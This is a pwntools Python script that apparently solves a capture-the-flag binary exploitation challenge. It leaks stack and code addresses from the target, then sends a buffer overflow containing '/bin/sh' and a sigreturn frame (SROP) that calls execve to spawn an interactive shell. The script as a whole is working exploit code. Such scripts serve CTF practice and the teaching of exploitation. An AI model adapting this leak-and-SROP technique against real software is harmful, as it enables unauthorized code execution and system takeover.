from pwn import *

context.arch = "amd64"
context.word_size = 64

file = "./chall"
s = process(executable=file, argv=[file])

# s = tcp(host="challenges1.gcc-ctf.com", port=4004)

#gdb.attach(s)


def recvuntil(until):
    data = s.recvuntil(until)
    return data[:-len(until)]

s.sendline(str(512 + 8 + 8).encode("iso-8859-1"))
s.recv()
s.sendline(b"")
leak = recvuntil(b"\n\n---\nEnter the length of the string (in decimal) > ")
stack_leak = u64(leak[-16:-8])
code_leak = u64(leak[-8:])
print("stack_leak: %#018x, code_leak: %#018x" % (stack_leak, code_leak))

elfbase = code_leak - 0x10ff

syscall = elfbase + 0x0000000000001034



#0x00007ffc7935bd80
#0x00007ffc7935bb58
s.sendline(str(0xf).encode("iso-8859-1"))

frame = SigreturnFrame()
frame.rax = 0x3b # execve
frame.rdi = stack_leak - (512 + 8 * 3)
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_leak
frame.rip = syscall

overflow = b"/bin/sh\0" + b"A" * (512 - 8)
payload = flat([
    overflow,
    b"B" * 8, # saved rbp
    syscall,
    bytes(frame),
])
s.sendline(payload)

s.interactive()

input("end")


# b *_read_and_print_str+47

0x7ffff7cc4ff8
0x0f357b5afce31c00